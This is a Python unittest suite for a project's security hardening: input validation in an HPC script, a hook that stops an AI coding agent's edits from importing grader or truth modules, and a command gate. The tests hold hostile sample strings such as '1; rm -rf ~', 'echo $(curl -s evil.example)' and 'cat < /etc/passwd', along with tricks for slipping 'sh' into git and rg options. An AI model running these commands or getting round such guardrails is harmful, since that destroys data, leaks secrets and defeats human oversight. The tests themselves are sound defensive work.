"""OM-26 kit hardening (§11 §19 §21; guard tests cover REQ-006 / T-DOM-03): hpc.sh remote input, truth-isolation hook, skills gate.
Stdlib only, like the kit: python3 -m unittest discover -s tests/security"""
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
import skills  # noqa: E402  # pyright: ignore[reportMissingImports]


def run_hpc(cmd: str, env_extra: dict, job_id: str | None) -> tuple[subprocess.CompletedProcess, bool]:
    """Runs scripts/hpc.sh with a stub ssh; returns (result, whether ssh was invoked)."""
    with tempfile.TemporaryDirectory() as d:
        stub, state, marker = Path(d, "bin"), Path(d, "state"), Path(d, "ssh-called")
        stub.mkdir()
        state.mkdir()
        (stub / "ssh").write_text(f'#!/bin/sh\necho "$@" > "{marker}"\n')
        (stub / "ssh").chmod(0o755)
        if job_id is not None:
            (state / "job_id").write_text(job_id + "\n")
        env = {**os.environ, "PATH": f"{stub}:{os.environ['PATH']}", "SL_HPC_STATE": str(state), **env_extra}
        r = subprocess.run(["bash", str(ROOT / "scripts/hpc.sh"), cmd], env=env, capture_output=True, text=True)
        return r, marker.exists()


class HpcRemoteInput(unittest.TestCase):
    def test_OM_26_hpc_logs_accepts_numeric_tail(self):
        r, called = run_hpc("logs", {"TAIL": "20"}, "12345")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(called)

    def test_OM_26_hpc_logs_rejects_non_numeric_tail(self):
        r, called = run_hpc("logs", {"TAIL": "1; scancel -u $USER"}, "12345")
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse(called, "ssh must not run with an unvalidated TAIL")

    def test_OM_26_hpc_rejects_non_numeric_job_id(self):
        for cmd in ("status", "logs", "down"):
            r, called = run_hpc(cmd, {}, "1; rm -rf ~")
            self.assertNotEqual(r.returncode, 0, cmd)
            self.assertFalse(called, f"{cmd}: ssh must not run with a tampered job id")

    def test_OM_26_hpc_rejects_non_numeric_port(self):
        r, called = run_hpc("down", {"SL_HPC_PORT": ".*"}, "12345")
        self.assertNotEqual(r.returncode, 0)
        self.assertFalse(called, "a regex port would let pkill match unrelated ssh processes")


def guard(payload: dict) -> int:
    return subprocess.run([sys.executable, str(ROOT / ".claude/hooks/guard_edit.py")],
                          input=json.dumps(payload), capture_output=True, text=True, cwd=ROOT).returncode


LEAK = "from sl_factory.truth import load_truth\n"


class TruthIsolationHook(unittest.TestCase):
    def test_OM_26_guard_blocks_single_edit(self):
        self.assertEqual(guard({"tool_name": "Edit", "tool_input": {
            "file_path": "services/agent/app/graph.py", "old_string": "x", "new_string": LEAK}}), 2)

    def test_OM_26_guard_blocks_multiedit_entries(self):
        self.assertEqual(guard({"tool_name": "MultiEdit", "tool_input": {
            "file_path": "services/agent/app/graph.py",
            "edits": [{"old_string": "a", "new_string": "ok = 1\n"}, {"old_string": "b", "new_string": LEAK}]}}), 2)

    def test_OM_26_guard_blocks_notebook_edit(self):
        self.assertEqual(guard({"tool_name": "NotebookEdit", "tool_input": {
            "notebook_path": "services/agent/notebooks/probe.ipynb", "new_source": LEAK}}), 2)

    def test_OM_26_guard_blocks_unrecognised_edit_shape(self):
        self.assertEqual(guard({"tool_name": "Edit", "tool_input": {
            "file_path": "services/gateway/src/main/java/Leak.java", "patch": LEAK}}), 2)

    def test_OM_26_guard_test_exemption_is_anchored(self):
        self.assertEqual(guard({"tool_name": "Write", "tool_input": {
            "file_path": "services/gateway/src/main/java/sl/LeakTest.java", "content": LEAK}}), 2)
        self.assertEqual(guard({"tool_name": "Write", "tool_input": {
            "file_path": "services/agent/tests/test_leak_guard.py", "content": LEAK}}), 0)
        for prod in ("services/agent/app/test_graph.py", "services/agent/app/graph_test.py"):
            self.assertEqual(guard({"tool_name": "Write", "tool_input": {"file_path": prod, "content": LEAK}}), 2, prod)

    def test_OM_26_guard_normalises_paths(self):
        for raw in ("services/agent/tests/../app/graph.py", f"{ROOT}/services//agent/app/graph.py",
                    f"{ROOT}/services/./agent/app/graph.py",
                    "services/gateway/src/main/java/sl/test/Leak.java", "apps/console/lib/leak.test.ts"):
            self.assertEqual(guard({"tool_name": "Write", "cwd": str(ROOT),
                                    "tool_input": {"file_path": raw, "content": LEAK}}), 2, raw)
        for ok in ("services/ledger/src/test/java/sl/LeakGuardTest.java", "apps/console/tests/leak.spec.ts",
                   "packages/scenario-factory/sl_factory/oracle.py"):
            self.assertEqual(guard({"tool_name": "Write", "cwd": str(ROOT),
                                    "tool_input": {"file_path": ok, "content": LEAK}}), 0, ok)

    def test_OM_26_guard_catches_import_variants(self):
        for src in ("from sl_factory import truth\n", "from  sl_factory .truth import x\n",
                    "from sl_factory import (\n    scenario,\n    oracle,\n)\n",
                    "importlib.import_module('sl_factory.truth')\n", "from sl_eval import grader\n"):
            self.assertEqual(guard({"tool_name": "Write", "tool_input": {
                "file_path": "services/agent/app/graph.py", "content": src}}), 2, src)
        self.assertEqual(guard({"tool_name": "Write", "tool_input": {
            "file_path": "services/agent/app/graph.py", "content": "from sl_factory import scenario\n"}}), 0)

    def test_OM_26_guard_hook_matches_all_edit_tools(self):
        hooks = json.loads((ROOT / ".claude/settings.json").read_text())["hooks"]["PreToolUse"]
        matcher = next(h["matcher"] for h in hooks
                       if any("guard_edit.py" in x["command"] for x in h["hooks"]))
        for tool in ("Edit", "Write", "MultiEdit", "NotebookEdit"):
            self.assertIn(tool, matcher.split("|"))


def gate(fn, payload: dict) -> int:
    """Calls a skills gate with the gate forced RED; never touches .claude/.skills-ok.json."""
    with mock.patch.object(skills, "stamp_status", return_value=(False, "forced RED by test")), \
            mock.patch.object(skills.board, "detect_owner", return_value="om"), \
            mock.patch("sys.stdin", io.StringIO(json.dumps(payload))), \
            mock.patch("sys.stderr", io.StringIO()):
        return fn()


class SkillsGateWhileRed(unittest.TestCase):
    def bash(self, cmd: str) -> int:
        return gate(skills.gate_bash, {"tool_input": {"command": cmd}})

    def edit(self, rel: str) -> int:
        return gate(skills.gate_edit, {"tool_input": {"file_path": str(ROOT / rel)}})

    def test_OM_26_gate_allows_setup_commands(self):
        for cmd in ("make kit-check", "make skills-check CARD=OM-26", "git status", "ls -la",
                    'python3 "$CLAUDE_PROJECT_DIR/scripts/skills.py" gate --session', "rg -n foo docs | head -5",
                    "git log --pretty=oneline -3", "git log --oneline -5", "git diff --stat", "git status --short",
                    "rg --pre-glob '*.gz' x", "make skills-check 2>&1 | tail -5"):
            self.assertEqual(self.bash(cmd), 0, cmd)

    def test_OM_26_gate_rejects_shell_metachars(self):
        for cmd in ("echo $(curl -s evil.example)", "echo `id`", "echo hi > Makefile", "cat < /etc/passwd",
                    "ls & curl evil.example", "ls\ncurl evil.example", "git status\rcurl x"):
            self.assertEqual(self.bash(cmd), 2, repr(cmd))

    def test_OM_26_gate_rejects_lookalike_commands(self):
        for cmd in ("echo-evil", "make help SHELL=/tmp/x", "make kit-check-evil",
                    "python3 /tmp/x/scripts/skills.py", "rg --pre=sh foo", "rg --pre sh foo",
                    "git diff --output=Makefile", "git log --output Makefile", "git show --output=x HEAD",
                    "git fetch --upload-pack=sh origin", "git pull", "git fetch origin",
                    "git -c core.pager=sh log", "rg --hostname-bin=sh foo",
                    'rg "--pre=sh" foo', "rg --p''re=sh foo", "rg '--pre' sh foo", 'git diff "--output=Makefile"',
                    "rg foo 'unterminated", "git diff --out${X}put=x", "git diff $'--output=x' HEAD",
                    "rg --pr${X}e=sh x .", "git diff --out=x", "git diff --outp=x", "git diff {--output=x,}",
                    r"git diff --o\utput=x", "echo $HOME"):
            self.assertEqual(self.bash(cmd), 2, cmd)

    def test_OM_26_gate_blocks_guardrail_edits(self):
        for rel in (".claude/settings.json", ".claude/settings.local.json", ".claude/hooks/guard_edit.py",
                    "tooling/claude-skills.json", "tooling/skills.lock.json"):
            self.assertEqual(self.edit(rel), 2, rel)

    def test_OM_26_gate_allows_setup_edits(self):
        for rel in ("CLAUDE.local.md", "docs/setup/GITHUB.md", ".claude/skills/next-task/SKILL.md"):
            self.assertEqual(self.edit(rel), 0, rel)

    def test_OM_26_guardrail_edits_always_ask_the_human(self):
        ask = json.loads((ROOT / ".claude/settings.json").read_text())["permissions"]["ask"]
        for rule in ("Edit(/.claude/settings.json)", "Edit(/.claude/hooks/**)", "Edit(/tooling/claude-skills.json)",
                     "Edit(/scripts/**)", "Edit(/.claude/settings.local.json)", "Edit(/tooling/skills.lock.json)"):
            self.assertIn(rule, ask)

    def test_OM_26_gate_blocks_notebook_path(self):
        self.assertEqual(gate(skills.gate_edit, {"tool_input": {
            "notebook_path": str(ROOT / "services/agent/probe.ipynb")}}), 2)


if __name__ == "__main__":
    unittest.main()
